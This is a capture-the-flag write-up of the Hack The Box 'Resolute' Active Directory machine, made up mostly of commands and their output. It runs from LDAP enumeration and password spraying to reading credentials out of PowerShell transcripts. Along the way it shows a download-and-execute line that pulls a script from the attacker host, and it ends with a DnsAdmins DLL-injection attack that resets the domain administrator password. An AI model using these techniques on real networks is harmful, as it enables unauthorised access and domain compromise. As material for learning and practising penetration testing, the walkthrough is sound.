---
title: "[HTB] Resolute"
permalink: /writeups/htb/resolute/
excerpt: "Quick write-up for the Resolute machine from Hack The Box."
tags:
  - hackthebox
  - activedirectory
  - pentest
  - writeup
  - msf
---

---

{% include toc icon="cog" title="Resolute Solution" %}

The [Resolute](https://app.hackthebox.com/machines/Resolute) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is an easy Windows Machine with a strong focus on Active Directory exploitation.

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_black.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

![image-center](/images/htb/htb_resolute_infocard.png){: .align-center}

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).
{: .notice--info}

# Recon/Enumeration

Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts.

Here, we don't have any credentials or hints about how to approach this machine, it's fairly common on HTB boxes. The first step would be reconnaissance, to check what we can see with the info we have, meaning, an IP address.

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the TCP ports open on the machine.

```bash
$ nmap -sV -Pn 10.129.96.155
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 13:43 EST
Nmap scan report for 10.129.96.155
Host is up (0.017s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-07 18:50:31Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
```

megabank.local

```bash
$ ldapsearch -h 10.129.96.155 -p 389 -x -b "dc=megabank,dc=local"
# extended LDIF
#
# LDAPv3
# base <dc=megabank,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# megabank.local
dn: DC=megabank,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=megabank,DC=local
instanceType: 5
```

```bash
$ ./windapsearch.py -d megabank.local --dc-ip 10.129.96.155 -U        
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.96.155
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=megabank,DC=local
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[+]     Found 25 users: 

cn: Guest

cn: DefaultAccount

cn: Ryan Bertrand
userPrincipalName: ryan@megabank.local

cn: Marko Novak
userPrincipalName: marko@megabank.local

cn: Sunita Rahman
userPrincipalName: sunita@megabank.local

cn: Abigail Jeffers
userPrincipalName: abigail@megabank.local

cn: Marcus Strong
userPrincipalName: marcus@megabank.local

cn: Sally May
userPrincipalName: sally@megabank.local

cn: Fred Carr
userPrincipalName: fred@megabank.local

cn: Angela Perkins
userPrincipalName: angela@megabank.local

cn: Felicia Carter
userPrincipalName: felicia@megabank.local

cn: Gustavo Pallieros
userPrincipalName: gustavo@megabank.local

cn: Ulf Berg
userPrincipalName: ulf@megabank.local

cn: Stevie Gerrard
userPrincipalName: stevie@megabank.local

cn: Claire Norman
userPrincipalName: claire@megabank.local

cn: Paulo Alcobia
userPrincipalName: paulo@megabank.local

cn: Steve Rider
userPrincipalName: steve@megabank.local

cn: Annette Nilsson
userPrincipalName: annette@megabank.local

cn: Annika Larson
userPrincipalName: annika@megabank.local

cn: Per Olsson
userPrincipalName: per@megabank.local

cn: Claude Segal
userPrincipalName: claude@megabank.local

cn: Melanie Purkis
userPrincipalName: melanie@megabank.local

cn: Zach Armstrong
userPrincipalName: zach@megabank.local

cn: Simon Faraday
userPrincipalName: simon@megabank.local

cn: Naoki Yamamoto
userPrincipalName: naoki@megabank.local


[*] Bye!
```

```bash
$ ./windapsearch.py -d megabank.local --dc-ip 10.129.96.155 -U --full | grep description 
description: Built-in account for guest access to the computer/domain
description: A user account managed by the system.
description: Account created. Password set to Welcome123!
```

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u users.txt -p 'Welcome123!' --continue-on-success
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\:Welcome123! STATUS_LOGON_FAILURE 
```

```bash
$ bloodhound-python -c All -u melanie -p 'Welcome123!' -d megabank.local -ns 10.129.96.155 --zip
INFO: Found AD domain: megabank.local
INFO: Connecting to LDAP server: Resolute.megabank.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: Resolute.megabank.local
INFO: Found 27 users
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MS02.megabank.local
INFO: Querying computer: Resolute.megabank.local
INFO: Done in 00M 04S
INFO: Compressing output into 20220207140125_bloodhound.zip
```

![image-center](/images/htb/htb_resolute_bloodhound_melanie.png){: .align-center}

```bash
$ evil-winrm -i 10.129.96.155 -u melanie  -p 'Welcome123!' 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> dir ..\Desktop


    Directory: C:\Users\melanie\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         2/7/2022  10:48 AM             34 user.txt
```

```bash
*Evil-WinRM* PS C:\Users\melanie\Desktop> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.xx/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended

...[snip]...

+------+------------------------------------------------+------+
| TEST | HARDENING > PowerShell Transcription           | INFO |
+------+------------------------------------------------+------+
| DESC | Check whether PowerShell Transcription is configured  |
|      | and enabled. If so, the path of the output log file   |
|      | will be returned.                                     |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


EnableTranscripting    : 0
EnableInvocationHeader : 0
OutputDirectory        : C:\PSTranscipts

...[snip]...

```

```bash
*Evil-WinRM* PS C:\> cd C:\PSTranscripts
*Evil-WinRM* PS C:\PSTranscripts> dir
```

```bash
*Evil-WinRM* PS C:\PSTranscripts> dir -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203


*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt


*Evil-WinRM* PS C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

...[snip]...

**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"

...[snip]...

```

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u ryan -p 'Serv3r4Admin4cc123!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
```


![image-center](/images/htb/htb_resolute_bloodhound_ryan.png){: .align-center}

The user ryan is found to be a member of DnsAdmins . Being a member of the DnsAdmins
group allows us to use the dnscmd.exe to specify a plugin DLL that should be loaded by the DNS
service. Let's create a DLL using msfvenom , that changes the administrator password.

```bash
$ evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> 
```

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise

ansferring this to the box would likely trigger Windows Defender, so we can use Impacket's
smbserver.py to start an SMB server and host the dll remotely

```bash
$ cd /tmp
$ msfvenom -p windows/x64/exec CMD='net user administrator Qwerty1! /domain' -f dll -o hello.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 307 bytes
Final size of dll file: 8704 bytes
Saved as: hello.dll
```

```bash
$ impacket-smbserver smb /tmp                      
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

The dnscmd utility can be used to set the remote DLL path into the Windows Registr
```

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> cmd.exe /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.62\smb\hello.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```


ext, we need to restart the DNS service in order to load our malicious DLL. DnsAdmins aren't
able to restart the DNS service by default, but in seems likely that they would be given
permissions to do this, and in this domain this is indeed the case

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2988
        FLAGS              :

```

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u Administrator -p 'Qwerty1!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\Administrator:Qwerty1! (Pwn3d!)
```

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u Administrator -p 'Qwerty1!' -x 'dir C:\Users\Administrator\Desktop\'        
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\Administrator:Qwerty1! (Pwn3d!)
SMB         10.129.96.155   445    RESOLUTE         [+] Executed command 
SMB         10.129.96.155   445    RESOLUTE         Volume in drive C has no label.
SMB         10.129.96.155   445    RESOLUTE         Volume Serial Number is D1AC-5AF6
SMB         10.129.96.155   445    RESOLUTE         
SMB         10.129.96.155   445    RESOLUTE         Directory of C:\Users\Administrator\Desktop
SMB         10.129.96.155   445    RESOLUTE         
SMB         10.129.96.155   445    RESOLUTE         12/04/2019  05:18 AM    <DIR>          .
SMB         10.129.96.155   445    RESOLUTE         12/04/2019  05:18 AM    <DIR>          ..
SMB         10.129.96.155   445    RESOLUTE         02/07/2022  10:48 AM                34 root.txt
SMB         10.129.96.155   445    RESOLUTE         1 File(s)             34 bytes
SMB         10.129.96.155   445    RESOLUTE         2 Dir(s)   2,475,847,680 bytes free
```